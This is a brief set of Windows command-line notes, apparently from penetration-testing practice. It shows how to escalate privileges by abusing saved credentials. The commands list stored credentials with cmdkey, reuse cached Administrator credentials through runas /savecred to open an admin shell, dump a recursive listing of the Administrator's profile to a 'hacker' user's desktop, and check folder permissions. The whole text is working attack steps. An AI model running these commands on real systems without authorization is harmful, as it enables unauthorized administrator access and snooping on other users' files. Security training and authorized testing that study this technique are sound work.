#show stored creds  
cmdkey /list  
  
#run as admin  
runas /savecred /user:Administrator "cmd.exe"  
runas /savecred /user:Administrator "cmd.exe /c dir /b /a /s c:\users\administrator > c:\users\hacker\desktop\files.txt"  
  
#check access  
icacls c:\users\administrator